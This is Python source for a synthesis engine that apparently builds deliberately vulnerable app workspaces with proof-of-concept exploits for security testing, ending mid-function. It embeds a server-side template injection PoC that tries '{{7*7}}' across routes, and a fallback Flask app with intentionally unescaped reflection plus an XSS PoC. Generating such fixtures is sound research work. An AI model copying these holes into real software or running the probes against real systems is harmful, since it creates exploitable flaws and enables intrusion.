"""Synthesis engine for generator.

Turns LLM JSON manifests into on-disk workspaces while enforcing guard rails
described in docs/handbook.md (스키마/아키텍처 섹션).
"""
from __future__ import annotations

import ast
import base64
import configparser
import fnmatch
import hashlib
import json
import re
import shutil
import sys
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Sequence, Tuple

from common.guardrails import GuardEngine, SUPPORTED_GENERATOR_ASSERTION_OPS
from common.hints import build_hint_payload
from common.deps.stdlib import load_stdlib_spec
from common.logging import get_logger
from common.prompts import build_guard_autofix_prompt, build_synthesis_prompt
from common.paths import ensure_dir
from common.roles import normalize_role, role_matches
from common.vuln_semantics import (
    evaluate_manifest_semantics,
    family_canonical_tags,
    normalize_vuln_id,
    semantic_error_summary,
)
from evals.static_signatures import analyze_static_signals
from common.rules import RuleSpec, load_rule, load_rulespec

from agents.generator.deps import (
    detect_node_installs,
    detect_node_required,
    detect_os_packages,
    detect_python_required,
    extract_node_declared,
)

try:  # Python >=3.11
    import tomllib
except ModuleNotFoundError:  # pragma: no cover - fallback for older interpreters
    tomllib = None

LOGGER = get_logger(__name__)
DEFAULT_POC_TEMPLATE = {
    # Prefer passing base-url explicitly so executor-resolved ports work even
    # when the generated PoC script uses a different default port.
    "cmd": "python poc.py --base-url {{base_url}}",
    "success_signature": "Exploit SUCCESS",
    "notes": "Auto-injected fallback PoC block",
}


def _default_allowlist() -> List[str]:
    return [
        "Dockerfile",
        "app.py",
        "poc.py",
        "requirements.txt",
        "schema.sql",
        "seed_data.sql",
        "README.md",
        "*.py",
        "*.sql",
        "requirements*.txt",
        "poc.*",
    ]


PYTHON_MODULE_PACKAGE_MAP = {
    "bs4": "beautifulsoup4",
    "pil": "pillow",
    "pillow": "pillow",
    "yaml": "pyyaml",
    "pyyaml": "pyyaml",
    "cv2": "opencv-python",
    "dateutil": "python-dateutil",
    "psycopg2": "psycopg2-binary",
    "psycopg2-binary": "psycopg2-binary",
    "sklearn": "scikit-learn",
    "bsddb3": "bsddb3",
    "lxml": "lxml",
    "pymysql": "pymysql",
    "mysqlclient": "mysqlclient",
}


PIP_INSTALL_PATTERN = re.compile(r"pip(?:3)?\s+install(?P<body>[^&;|\n]*)", re.IGNORECASE)
EXTERNAL_DB_PACKAGES = {
    "pymysql",
    "mysqlclient",
    "mysql-connector",
    "mysql-connector-python",
    "psycopg2",
    "psycopg2-binary",
    "pg8000",
    "asyncpg",
}
EXTERNAL_DB_KEYWORDS = {
    "pymysql",
    "mysqlclient",
    "mysql.connector",
    "psycopg2",
    "pg8000",
    "asyncpg",
    "mysql-connector",
    "mysql.connector",
}
MYSQL_DRIVERS = {
    "pymysql",
    "mysqlclient",
    "mysql-connector",
    "mysql-connector-python",
}
POSTGRES_DRIVERS = {
    "psycopg2",
    "psycopg2-binary",
    "pg8000",
    "asyncpg",
}


@dataclass
class DeclaredDependencies:
    combined: set[str]
    from_deps_field: set[str]
    from_requirements: set[str]
    requirements_by_path: Dict[str, set[str]]


@dataclass(frozen=True)
class SynthesisLimits:
    """Constraints mirrored in docs/handbook.md (generator_manifest)."""

    max_files: int = 12
    max_bytes_per_file: int = 64_000
    allowlist: Sequence[str] = field(default_factory=_default_allowlist)

    @classmethod
    def from_requirement(cls, requirement: Dict[str, Any]) -> "SynthesisLimits":
        provided = requirement.get("synthesis_limits") or {}
        allowlist = provided.get("allowlist") or _default_allowlist()
        return cls(
            max_files=int(provided.get("max_files", cls.max_files)),
            max_bytes_per_file=int(provided.get("max_bytes_per_file", cls.max_bytes_per_file)),
            allowlist=tuple(allowlist),
        )

    def to_dict(self) -> Dict[str, Any]:
        return {
            "max_files": self.max_files,
            "max_bytes_per_file": self.max_bytes_per_file,
            "allowlist": list(self.allowlist),
        }


@dataclass
class CandidateReport:
    """Aggregated info per synthesis trial."""

    index: int
    manifest: Dict[str, Any]
    raw_response: str
    violations: List[str]
    score: float
    static_report: Dict[str, Any]
    guard_report: Dict[str, Any] | None = None
    fallback_used: bool = False
    fallback_class: str = ""
    family_override_applied: bool = False
    llm_stub_used: bool = False
    llm_failure_class: str = ""
    llm_failure_message: str = ""

    @property
    def manifest_digest(self) -> str:
        serialized = json.dumps(self.manifest, sort_keys=True, ensure_ascii=False)
        return hashlib.sha256(serialized.encode("utf-8")).hexdigest()

    def to_summary(self) -> Dict[str, Any]:
        files = self.manifest.get("files") or []
        file_paths = [entry.get("path") for entry in files if isinstance(entry, dict)]
        return {
            "index": self.index,
            "score": round(self.score, 3),
            "violations": self.violations,
            "accepted": not self.violations,
            "manifest_digest": self.manifest_digest,
            "file_paths": file_paths,
            "pattern_tags": self.manifest.get("pattern_tags", []),
            "raw_excerpt": self.raw_response[:200],
            "static_report": self.static_report,
            "dep_guard": self.guard_report or {},
            "fallback_used": self.fallback_used,
            "fallback_class": self.fallback_class,
            "family_override_applied": self.family_override_applied,
            "llm_stub_used": self.llm_stub_used,
            "llm_failure_class": self.llm_failure_class,
            "llm_failure_message": self.llm_failure_message,
        }


@dataclass
class SynthesisOutcome:
    """Return payload after the engine finishes."""

    selected: CandidateReport
    written_files: List[str]
    reports: List[CandidateReport]


class ManifestValidationError(RuntimeError):
    """Raised when every manifest candidate violates guard rails."""


class SynthesisEngine:
    """LLM-backed synthesis helper."""

    def __init__(
        self,
        *,
        sid: str,
        llm,
        limits: SynthesisLimits,
        workspace: Path,
        metadata_dir: Path,
        mode: str,
        user_deps: Sequence[str] | None = None,
    ) -> None:
        self.sid = sid
        self.llm = llm
        self.limits = limits
        self.workspace = workspace
        self.metadata_dir = ensure_dir(metadata_dir)
        self.mode = mode
        self._user_deps = [dep.strip() for dep in (user_deps or []) if isinstance(dep, str) and dep.strip()]
        ensure_dir(self.workspace.parent)
        self._dep_guard_config: Dict[str, Any] = {}
        base_stdlib = getattr(sys, "stdlib_module_names", None) or set()
        self._stdlib_modules = {
            self._canonicalize_package_name(name)
            for name in base_stdlib
            if self._canonicalize_package_name(name)
        }
        self._module_alias_map = dict(PYTHON_MODULE_PACKAGE_MAP)
        self._default_versions = {
            "requests": "2.32.2",
            "pysqlite3-binary": "0.5.2",
        }
        self._auto_patch_denylist = {"logging", "sqlite3"}
        self._stdlib_aliases_loaded = False
        self._rule: Dict[str, Any] = {}
        self._rulespec: Optional[RuleSpec] = None
        self._guard_engine: Optional[GuardEngine] = None
        self._guard_spec_payload: Dict[str, Any] = {}
        self._guard_autofix_level: str = "none"
        self._guard_autofix_max_attempts: int = 0

    def run(
        self,
        *,
        requirement: Dict[str, Any],
        rag_context: str,
        hints: str,
        failure_context: str,
        candidate_k: int,
        researcher_report: str = "",
        guard_spec: str = "",
        guard_spec_payload: Optional[Dict[str, Any]] = None,
        poc_template: Dict[str, Any] | None = None,
    ) -> SynthesisOutcome:
        """Generate k candidates, select the best, and materialize it."""

        candidate_k = max(1, int(candidate_k or 1))
        reports: List[CandidateReport] = []
        self._requirement = requirement
        self._load_stdlib_spec()
        self._dep_guard_config = requirement.get("dep_guard") or {}
        self._auto_patch_enabled = bool(self._dep_guard_config.get("auto_patch"))
        vuln_id = requirement.get("vuln_id")
        self._rule = load_rule(vuln_id)
        try:
            self._rulespec = load_rulespec(vuln_id)
        except Exception:  # pragma: no cover - defensive fallback
            self._rulespec = None
        self._guard_spec_payload = guard_spec_payload if isinstance(guard_spec_payload, dict) else {}
        self._guard_engine = GuardEngine(str(vuln_id or ""), self._guard_spec_payload or None)
        guard_autofix = (
            (self._guard_engine.policy_snapshot.get("autofix") or {})
            if isinstance(self._guard_engine, GuardEngine)
            else {}
        )
        self._guard_autofix_level = str(guard_autofix.get("level") or "none").strip().lower()
        try:
            self._guard_autofix_max_attempts = int(guard_autofix.get("max_attempts", 0))
        except Exception:
            self._guard_autofix_max_attempts = 0
        if self._guard_autofix_max_attempts < 0:
            self._guard_autofix_max_attempts = 0
        poc_template = self._normalize_poc_template(poc_template)

        for idx in range(1, candidate_k + 1):
            messages = build_synthesis_prompt(
                requirement,
                rag_context,
                hints=hints,
                researcher_report=researcher_report,
                failure_context=failure_context,
                limits=self.limits.to_dict(),
                candidate_index=idx,
                poc_template=poc_template,
                guard_spec=guard_spec,
            )
            raw = self.llm.generate(messages)
            manifest = self._parse_manifest(raw, idx)
            fallback_used = self._manifest_uses_deterministic_fallback(manifest)
            fallback_class = self._manifest_fallback_class(manifest)
            manifest = self._apply_poc_template(manifest, poc_template)
            manifest = self._ensure_fallback_poc(manifest, poc_template)
            before_family_override = json.dumps(manifest, sort_keys=True, ensure_ascii=False)
            manifest = self._stabilize_pattern_specific_artifacts(manifest, poc_template)
            family_override_applied = bool(
                self._is_template_injection_family()
                and before_family_override != json.dumps(manifest, sort_keys=True, ensure_ascii=False)
            )
            manifest = self._inject_user_deps(manifest)
            declared = self._extract_declared_dependencies(manifest)
            required_static = self._detect_required_dependencies(manifest)
            llm_section = None
            if self._dep_guard_config.get("llm_assist") or self._auto_patch_enabled:
                llm_section = self._llm_infer_dependencies(manifest, required_static, declared)
            auto_patch_info = (
                self._maybe_auto_patch_dependencies(manifest, declared, required_static, llm_section)
                if self._auto_patch_enabled
                else {"enabled": False}
            )
            if auto_patch_info.get("patched") or auto_patch_info.get("synced_requirements"):
                declared = self._extract_declared_dependencies(manifest)
            violations, guard_report = self._guard_manifest_with_autofix(
                manifest,
                precomputed_llm=llm_section,
                auto_patch=auto_patch_info,
            )
            static_report = self._analyze_static_signals(manifest)
            score = self._score_candidate(len(violations), static_report.get("score", 0.0))
            reports.append(
                CandidateReport(
                    index=idx,
                    manifest=manifest,
                    raw_response=raw,
                    violations=violations,
                    score=score,
                    static_report=static_report,
                    guard_report=guard_report,
                    fallback_used=fallback_used,
                    fallback_class=fallback_class,
                    family_override_applied=family_override_applied,
                    llm_stub_used=bool(getattr(self.llm, "use_stub", False)),
                    llm_failure_class=str(getattr(self.llm, "last_error_class", "") or ""),
                    llm_failure_message=str(getattr(self.llm, "last_error_message", "") or ""),
                )
            )

        self._write_candidate_log(reports)
        accepted = [report for report in reports if not report.violations]
        if not accepted:
            self._record_guard_failure(reports)
            violation_lines = [
                f"candidate #{report.index}: {', '.join(report.violations)}"
                for report in reports
                if report.violations
            ]
            LOGGER.error(
                "Synthesis failed for %s: %s",
                self.sid,
                "; ".join(violation_lines) or "no valid manifest",
            )
            raise ManifestValidationError("All synthesis manifests violated guard rails.")
        selected = max(accepted, key=lambda report: (report.score, -report.index))
        requires_external_db = self._manifest_requires_external_db(selected.manifest)
        written = self._materialize(selected.manifest)
        self._write_records(
            selected,
            reports,
            hints,
            rag_context,
            failure_context,
            requires_external_db=requires_external_db,
        )
        return SynthesisOutcome(selected=selected, written_files=written, reports=reports)

    # --- internal helpers -------------------------------------------------
    @staticmethod
    def _score_candidate(violation_count: int, signal_score: float) -> float:
        base = max(0.0, 1.0 - 0.2 * violation_count)
        bonus = max(0.0, min(1.0, signal_score)) * 0.3
        return min(1.0, round(base + bonus, 3))

    def _analyze_static_signals(self, manifest: Dict[str, Any]) -> Dict[str, Any]:
        vuln = str((self._requirement or {}).get("vuln_id") or "").strip().lower()
        if not vuln:
            return {"signals": {}, "hit_count": 0, "score": 0.0, "keywords_found": []}
        return analyze_static_signals(vuln, manifest)

    def _normalize_poc_template(self, template: Dict[str, Any] | None) -> Dict[str, Any]:
        normalized = dict(DEFAULT_POC_TEMPLATE)
        if isinstance(template, dict):
            for key, value in template.items():
                if value is not None and value != "" and value != [] and value != {}:
                    normalized[key] = value
        # Prefer RuleSpec.runtime markers when available so that the
        # success/flag contracts are driven by the evaluation policy
        # rather than hard-coded defaults for specific CWE templates.
        runtime: Dict[str, Any] = {}
        if isinstance(self._rulespec, RuleSpec) and isinstance(self._rulespec.runtime, dict):
            runtime = self._rulespec.runtime
        markers = runtime.get("success_text_markers") or []
        runtime_sig = markers[0] if isinstance(markers, list) and markers else None
        rule_sig = (self._rule or {}).get("success_signature") if hasattr(self, "_rule") else None
        success_signature = runtime_sig or rule_sig or normalized.get("success_signature") or "Exploit SUCCESS"
        normalized["success_signature"] = success_signature
        runtime_flag = runtime.get("flag_token")
        rule_flag = (self._rule or {}).get("flag_token") if hasattr(self, "_rule") else None
        template_flag = normalized.get("flag_token")
        flag_token = runtime_flag or rule_flag or template_flag
        json_success_key = runtime.get("json_success_key")
        json_success_has_value = "json_success_value" in runtime
        json_success_value = runtime.get("json_success_value")
        json_flag_key = runtime.get("json_flag_key")
        if flag_token:
            normalized["flag_token"] = flag_token
        else:
            normalized.pop("flag_token", None)
        if isinstance(json_success_key, str) and json_success_key.strip():
            normalized["json_success_key"] = json_success_key.strip()
            if json_success_has_value:
                normalized["json_success_value"] = json_success_value
        if isinstance(json_flag_key, str) and json_flag_key.strip():
            normalized["json_flag_key"] = json_flag_key.strip()
        if normalized.get("json_success_key"):
            flag_note = (
                "On exploit success, parse the HTTP response JSON structurally and require "
                f"{normalized['json_success_key']!r} == {normalized.get('json_success_value')!r} before printing "
                f"'{success_signature}'."
            )
            if flag_token:
                flag_note += f" Then print '{flag_token}'."
            elif normalized.get("json_flag_key"):
                flag_note += f" If a response flag exists, read it from JSON key {normalized['json_flag_key']!r}."
        elif flag_token:
            flag_note = f"On exploit success, print '{success_signature}' and '{flag_token}'."
        else:
            flag_note = f"On exploit success, print '{success_signature}'."
        notes = normalized.get("notes", "").strip()
        normalized["notes"] = f"{notes} {flag_note}".strip()
        return normalized

    def _load_stdlib_spec(self) -> None:
        language = (self._requirement.get("language") or "python").lower()
        runtime = self._requirement.get("runtime") or {}
        version = (
            runtime.get("language_version")
            or runtime.get("python_version")
            or self._requirement.get("language_version")
            or "3.11"
        )
        spec = load_stdlib_spec(language=language, version=str(version))
        # Merge aliases before canonicalizing stdlib names so alias-based
        # lookups (ex: sqlite3 -> pysqlite3-binary) are consistent.
        self._module_alias_map = dict(PYTHON_MODULE_PACKAGE_MAP)
        self._module_alias_map.update({k.lower(): v for k, v in spec.aliases.items()})
        raw_stdlib = {
            (name or "").strip().lower().replace("_", "-")
            for name in spec.stdlib_modules
            if (name or "").strip()
        }
        canonical_stdlib = {
            self._canonicalize_package_name(name)
            for name in spec.stdlib_modules
            if self._canonicalize_package_name(name)
        }
        self._stdlib_modules = raw_stdlib | canonical_stdlib
        self._default_versions = {
            "requests": "2.32.2",
            "pysqlite3-binary": "0.5.2",
        }
        self._default_versions.update(spec.default_versions)
        self._auto_patch_denylist = {"logging", "sqlite3"} | spec.auto_patch_denylist
        self._stdlib_aliases_loaded = True

    def _apply_poc_template(self, manifest: Dict[str, Any], template: Dict[str, Any]) -> Dict[str, Any]:
        poc = manifest.get("poc")
        if not isinstance(poc, dict):
            manifest["poc"] = dict(template)
            return manifest
        for key, value in template.items():
            if not poc.get(key):
                poc[key] = value
        manifest["poc"] = poc
        return manifest

    def _ensure_manifest_dependency(self, manifest: Dict[str, Any], spec: str) -> Dict[str, Any]:
        token = str(spec or "").strip()
        if not token:
            return manifest
        deps = manifest.get("deps")
        if not isinstance(deps, list):
            deps = []
            manifest["deps"] = deps
        canonical = token.split("==", 1)[0].strip().lower()
        seen = {
            str(item).split("==", 1)[0].strip().lower()
            for item in deps
            if isinstance(item, str) and str(item).strip()
        }
        if canonical not in seen:
            deps.append(token)
        files = manifest.get("files")
        if not isinstance(files, list):
            return manifest
        req_entry = None
        for entry in files:
            if not isinstance(entry, dict):
                continue
            if str(entry.get("path") or "").strip().lower() == "requirements.txt":
                req_entry = entry
                break
        if req_entry is None:
            req_entry = {
                "path": "requirements.txt",
                "role": "helper",
                "description": "Auto-generated requirements from deterministic fallback helper",
                "content": "",
            }
            files.append(req_entry)
        content = str(req_entry.get("content") or "")
        existing = [line.strip() for line in content.splitlines() if line.strip()]
        existing_seen = {line.split("==", 1)[0].strip().lower() for line in existing}
        for dep in deps:
            if not isinstance(dep, str) or not dep.strip():
                continue
            dep_line = dep.strip()
            dep_name = dep_line.split("==", 1)[0].strip().lower()
            if dep_name in existing_seen:
                continue
            existing.append(dep_line)
            existing_seen.add(dep_name)
        req_entry["content"] = "\n".join(existing).strip() + ("\n" if existing else "")
        return manifest

    def _ensure_fallback_poc(self, manifest: Dict[str, Any], template: Dict[str, Any]) -> Dict[str, Any]:
        files = manifest.get("files")
        if not isinstance(files, list):
            manifest["files"] = files = []
        has_poc_file = any(
            isinstance(entry, dict)
            and (
                str(entry.get("role") or "").strip().lower() == "poc_entry"
                or Path(str(entry.get("path") or "")).name.strip().lower().startswith("poc.")
            )
            for entry in files
        )
        if has_poc_file:
            return manifest
        content = self._build_fallback_poc_content(manifest, template)
        files.append(
            {
                "path": "poc.py",
                "role": "poc_entry",
                "description": "Fallback PoC used when the LLM omits poc.py",
                "content": content,
            }
        )
        return manifest

    def _stabilize_pattern_specific_artifacts(self, manifest: Dict[str, Any], template: Dict[str, Any]) -> Dict[str, Any]:
        if not self._is_template_injection_family():
            return manifest
        files = manifest.get("files")
        if not isinstance(files, list):
            manifest["files"] = files = []

        poc = manifest.get("poc")
        if not isinstance(poc, dict):
            poc = {}
            manifest["poc"] = poc
        success_signature = str(template.get("success_signature") or poc.get("success_signature") or "Exploit SUCCESS").strip() or "Exploit SUCCESS"
        flag_token = str(template.get("flag_token") or poc.get("flag_token") or "").strip()
        poc["cmd"] = "python poc.py --base-url {{base_url}}"
        poc["success_signature"] = success_signature
        if flag_token:
            poc["flag_token"] = flag_token
        else:
            poc.pop("flag_token", None)
        poc["notes"] = (
            "Deterministic Template Injection PoC: tries common Flask endpoints and name-like parameters with "
            "payload containing '{{7*7}}', then prints the required success signature and optional flag token on success."
        )
        manifest["poc"] = poc
        manifest = self._ensure_manifest_dependency(manifest, "requests==2.31.0")

        content = self._build_template_injection_poc_content(manifest, success_signature, flag_token)
        poc_entry = None
        for entry in files:
            if not isinstance(entry, dict):
                continue
            role = normalize_role(entry.get("role"))
            path = str(entry.get("path") or "").strip()
            if role_matches(role, "poc_entry") or Path(path).name.lower().startswith("poc."):
                poc_entry = entry
                break
        if poc_entry is None:
            files.append(
                {
                    "path": "poc.py",
                    "role": "poc_entry",
                    "description": "Deterministic Template Injection PoC",
                    "content": content,
                }
            )
        else:
            poc_entry["path"] = str(poc_entry.get("path") or "poc.py").strip() or "poc.py"
            poc_entry["role"] = "poc_entry"
            poc_entry["content"] = content
        return manifest

    def _is_template_injection_family(self) -> bool:
        vuln = str((self._requirement or {}).get("vuln_id") or "").strip().lower()
        pattern_id = str((self._requirement or {}).get("pattern_id") or "").strip().lower()
        label = str((self._requirement or {}).get("vuln_name") or (self._requirement or {}).get("vuln_label") or "").strip().lower()
        return (
            "template-injection" in pattern_id
            or "ssti" in pattern_id
            or "template injection" in label
            or "ssti" in label
            or vuln == "name-template-injection"
        )

    def _template_injection_route_candidates(self, manifest: Dict[str, Any]) -> List[str]:
        files = manifest.get("files") if isinstance(manifest, dict) else []
        service_text = ""
        for entry in files if isinstance(files, list) else []:
            if not isinstance(entry, dict):
                continue
            role = normalize_role(entry.get("role"))
            if role_matches(role, "service_main"):
                service_text = str(entry.get("content") or "")
                break
        discovered: List[str] = []
        for match in re.finditer(r"@app\.(?:get|post|route)\(\s*['\"](?P<path>/[^'\"]*)['\"]", service_text):
            path = str(match.group("path") or "").strip()
            if not path or path == "/health" or path in discovered:
                continue
            discovered.append(path)
        defaults = ["/greet", "/display_name", "/hello", "/"]
        for path in defaults:
            if path not in discovered:
                discovered.append(path)
        return discovered or defaults

    def _build_template_injection_poc_content(
        self,
        manifest: Dict[str, Any],
        success_signature: str,
        flag_token: str,
    ) -> str:
        route_candidates = self._template_injection_route_candidates(manifest)
        payload_prefix = flag_token or "SSTI_OK"
        default_payload = f"{payload_prefix} {{{{7*7}}}}"
        default_base = self._default_base_url_for_manifest(manifest, fallback_port=5000)
        lines = [
            "import argparse",
            "import sys",
            "import requests",
            "",
            f"SUCCESS_SIGNATURE = {success_signature!r}",
            f"FLAG_TOKEN = {flag_token!r}",
            f"DEFAULT_PAYLOAD = {default_payload!r}",
            f"ROUTE_CANDIDATES = {route_candidates!r}",
            "PARAM_CANDIDATES = ['name', 'input', 'payload', 'template', 'value', 'q']",
            "",
            "def _request(method: str, url: str, param: str, payload: str):",
            "    if method == 'GET':",
            "        return requests.get(url, params={param: payload}, timeout=5)",
            "    return requests.post(url, data={param: payload}, timeout=5)",
            "",
            "def main() -> int:",
            "    ap = argparse.ArgumentParser()",
            f"    ap.add_argument('--base-url', default={default_base!r})",
            "    ap.add_argument('--payload', default=DEFAULT_PAYLOAD)",
            "    args = ap.parse_args()",
            "    base = args.base_url.rstrip('/')",
            "    for route in ROUTE_CANDIDATES:",
            "        url = base + route",
            "        for param in PARAM_CANDIDATES:",
            "            for method in ('GET', 'POST'):",
            "                try:",
            "                    resp = _request(method, url, param, args.payload)",
            "                except Exception:",
            "                    continue",
            "                body = resp.text or ''",
            "                if resp.status_code == 200 and '49' in body:",
            "                    print('49')",
            "                    print(SUCCESS_SIGNATURE)",
            "                    if FLAG_TOKEN:",
            "                        print(FLAG_TOKEN)",
            "                    return 0",
            "    print('Exploit failed: arithmetic marker not observed', file=sys.stderr)",
            "    return 1",
            "",
            "if __name__ == '__main__':",
            "    sys.exit(main())",
            "",
        ]
        return "\n".join(lines)

    @staticmethod
    def _default_base_url_for_manifest(manifest: Dict[str, Any], *, fallback_port: int = 5000) -> str:
        port = fallback_port
        if isinstance(manifest, dict):
            run = manifest.get("run")
            if isinstance(run, dict):
                try:
                    candidate = int(run.get("port") or fallback_port)
                except Exception:
                    candidate = fallback_port
                if candidate > 0:
                    port = candidate
        return f"http://127.0.0.1:{port}"

    def _parse_manifest(self, raw: str, idx: int) -> Dict[str, Any]:
        try:
            manifest = json.loads(raw)
            if isinstance(manifest, dict):
                return self._normalize_manifest_roles(manifest)
        except json.JSONDecodeError:
            start = raw.find("{")
            end = raw.rfind("}")
            if start != -1 and end != -1 and end > start:
                snippet = raw[start : end + 1]
                try:
                    manifest = json.loads(snippet)
                    if isinstance(manifest, dict):
                        return self._normalize_manifest_roles(manifest)
                except json.JSONDecodeError:
                    pass
        LOGGER.warning("Candidate %s emitted non-JSON manifest; using fallback.", idx)
        return self._normalize_manifest_roles(self._fallback_manifest())

    @staticmethod
    def _manifest_uses_deterministic_fallback(manifest: Dict[str, Any]) -> bool:
        if not isinstance(manifest, dict):
            return False
        pattern_tags = manifest.get("pattern_tags") or []
        if isinstance(pattern_tags, list):
            lowered = {str(tag).strip().lower() for tag in pattern_tags if isinstance(tag, str)}
            if "fallback" in lowered:
                return True
        metadata = manifest.get("metadata")
        if isinstance(metadata, dict):
            origin = str(metadata.get("generation_origin") or "").strip().lower()
            if origin == "deterministic_fallback":
                return True
        return False

    @staticmethod
    def _manifest_fallback_class(manifest: Dict[str, Any]) -> str:
        if not isinstance(manifest, dict):
            return ""
        metadata = manifest.get("metadata")
        if isinstance(metadata, dict):
            value = str(metadata.get("fallback_class") or "").strip()
            if value:
                return value
        return ""

    @staticmethod
    def _normalize_manifest_roles(manifest: Dict[str, Any]) -> Dict[str, Any]:
        files = manifest.get("files")
        if not isinstance(files, list):
            return manifest
        for entry in files:
            if not isinstance(entry, dict):
                continue
            role = normalize_role(entry.get("role"))
            if role:
                entry["role"] = role
        return manifest

    def _fallback_manifest(self) -> Dict[str, Any]:
        """Deterministic manifest used when the LLM stub is active."""

        vuln_id = self._requirement.get("vuln_id", "CWE-UNKNOWN")
        normalized_vuln = normalize_vuln_id(str(vuln_id or ""))
        stack = self._requirement.get("framework") or self._requirement.get("language", "python")
        notes = (
            "Fallback manifest auto-generated because the LLM response was not valid JSON or the LLM call failed. "
            "The layout is intentionally minimal and attempts to preserve family-specific semantics for degraded-mode testing."
        )
        poc_template = self._normalize_poc_template(None)
        success_signature = str(poc_template.get("success_signature") or "Exploit SUCCESS").strip() or "Exploit SUCCESS"
        flag_token = poc_template.get("flag_token")
        if not isinstance(flag_token, str) or not flag_token.strip():
            flag_token = ""

        port = 8000
        if self._is_sqli_family():
            return self._fallback_manifest_sqli(
                vuln_id=str(vuln_id),
                normalized_vuln=normalized_vuln,
                stack=str(stack),
                port=port,
                notes=notes,
                success_signature=success_signature,
                flag_token=flag_token,
            )
        if self._is_csrf_family():
            return self._fallback_manifest_csrf(
                vuln_id=str(vuln_id),
                normalized_vuln=normalized_vuln,
                stack=str(stack),
                port=port,
                notes=notes,
                success_signature=success_signature,
                flag_token=flag_token,
            )
        if self._is_ssrf_family():
            return self._fallback_manifest_ssrf(
                vuln_id=str(vuln_id),
                normalized_vuln=normalized_vuln,
                stack=str(stack),
                port=port,
                notes=notes,
                success_signature=success_signature,
                flag_token=flag_token,
            )
        if self._is_xss_family():
            return self._fallback_manifest_xss(
                vuln_id=str(vuln_id),
                normalized_vuln=normalized_vuln,
                stack=str(stack),
                port=port,
                notes=notes,
                success_signature=success_signature,
                flag_token=flag_token,
            )
        if self._is_deserialization_family():
            return self._fallback_manifest_deserialization(
                vuln_id=str(vuln_id),
                normalized_vuln=normalized_vuln,
                stack=str(stack),
                port=port,
                notes=notes,
                success_signature=success_signature,
                flag_token=flag_token,
            )
        if self._is_template_injection_family():
            return self._fallback_manifest_template_injection(
                vuln_id=str(vuln_id),
                normalized_vuln=normalized_vuln,
                stack=str(stack),
                port=port,
                notes=notes,
                success_signature=success_signature,
                flag_token=flag_token,
            )
        if self._is_open_redirect_family():
            return self._fallback_manifest_open_redirect(
                vuln_id=str(vuln_id),
                normalized_vuln=normalized_vuln,
                stack=str(stack),
                port=port,
                notes=notes,
                success_signature=success_signature,
                flag_token=flag_token,
            )
        if self._is_path_traversal_family():
            return self._fallback_manifest_path_traversal(
                vuln_id=str(vuln_id),
                normalized_vuln=normalized_vuln,
                stack=str(stack),
                port=port,
                notes=notes,
                success_signature=success_signature,
                flag_token=flag_token,
            )

        reflect_path = "/reflect"
        default_payload = "<script>alert(1)</script>"

        poc_block: Dict[str, Any] = {
            "cmd": "python poc.py --base-url {{base_url}}",
            "success_signature": success_signature,
        }
        if flag_token:
            poc_block["flag_token"] = flag_token
        if isinstance(poc_template.get("notes"), str) and poc_template.get("notes").strip():
            poc_block["notes"] = poc_template.get("notes")

        return {
            "intent": f"{vuln_id} fallback synthesis",
            "pattern_tags": self._fallback_pattern_tags(vuln_id),
            "files": [
                {
                    "path": "Dockerfile",
                    "role": "helper",
                    "description": "Build Python image for fallback bundle.",
                    "content": (
                        "FROM python:3.11-slim\n"
                        "WORKDIR /app\n"
                        "COPY . /app\n"
                        "RUN pip install --no-cache-dir -r requirements.txt\n"
                        f"EXPOSE {port}\n"
                        "CMD [\"python\", \"app.py\"]\n"
                    ),
                },
                {
                    "path": "requirements.txt",
                    "role": "helper",
                    "description": "Pinned deps for SBOM.",
                    "content": "Flask==3.0.0\n",
                },
                {
                    "path": "app.py",
                    "role": "service_main",
                    "description": f"{stack} fallback vulnerable endpoint (reflect).",
                    "content": (
                        "from flask import Flask, request\n\n"
                        "app = Flask(__name__)\n\n"
                        "@app.get('/health')\n"
                        "def health():\n"
                        "    return {'ok': True}\n\n"
                        f"@app.get('{reflect_path}')\n"
                        "def reflect():\n"
                        "    # Intentionally unsafe reflection: demonstrates a generic input-handling flaw.\n"
                        "    value = request.args.get('q', '')\n"
                        "    return f\"<p>{value}</p>\"  # no escaping\n\n"
                        "if __name__ == '__main__':\n"
                        f"    app.run(host='0.0.0.0', port={port})\n"
                    ),
                },
                {
                    "path": "poc.py",
                    "role": "poc_entry",
                    "description": "Fallback PoC that triggers reflect and prints the success marker.",
                    "content": (
                        "import argparse\n"
                        "import sys\n"
                        "from urllib.parse import quote\n"
                        "from urllib.request import urlopen\n"
                        "from urllib.error import URLError, HTTPError\n\n"
                        f"SUCCESS_SIGNATURE = {success_signature!r}\n"
                        f"FLAG_TOKEN = {flag_token!r}\n"
                        f"DEFAULT_PAYLOAD = {default_payload!r}\n"
                        f"PATH = {reflect_path!r}\n\n"
                        "def exploit(base_url: str, payload: str) -> bool:\n"
                        "    url = base_url.rstrip('/') + PATH + '?q=' + quote(payload)\n"
                        "    try:\n"
                        "        with urlopen(url, timeout=5) as resp:\n"
                        "            body = resp.read().decode('utf-8', errors='ignore')\n"
                        "    except (HTTPError, URLError) as exc:\n"
                        "        print(f'[fallback] request failed: {exc}', file=sys.stderr)\n"
                        "        return False\n"
                        "    return payload in body\n\n"
                        "def main() -> None:\n"
                        "    parser = argparse.ArgumentParser(description='Fallback PoC')\n"
                        f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
                        "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)\n"
                        "    args = parser.parse_args()\n"
                        "    if exploit(args.base_url, args.payload):\n"
                        "        print(SUCCESS_SIGNATURE)\n"
                        "        if FLAG_TOKEN:\n"
                        "            print(FLAG_TOKEN)\n"
                        "        sys.exit(0)\n"
                        "    print('[fallback] exploit did not succeed', file=sys.stderr)\n"
                        "    sys.exit(1)\n\n"
                        "if __name__ == '__main__':\n"
                        "    main()\n"
                    ),
                },
                {
                    "path": "README.md",
                    "role": "helper",
                    "description": "Quickstart instructions.",
                    "content": (
                        f"# {vuln_id} fallback bundle\n"
                        "```bash\n"
                        "docker build -t fallback-bundle .\n"
                        f"docker run -p {port}:{port} fallback-bundle\n"
                        f"python poc.py --base-url http://127.0.0.1:{port}\n"
                        "```\n"
                    ),
                },
            ],
            "deps": ["Flask==3.0.0"],
            "build": {"command": "pip install --no-cache-dir -r requirements.txt"},
            "run": {"command": "python app.py", "port": port},
            "poc": poc_block,
            "notes": notes,
            "metadata": {
                "sid": self.sid,
                "stack": stack,
                "cwe": vuln_id,
                "generation_origin": "deterministic_fallback",
                "fallback_class": "generic_unsupported_family",
            },
        }

    def _is_sqli_family(self) -> bool:
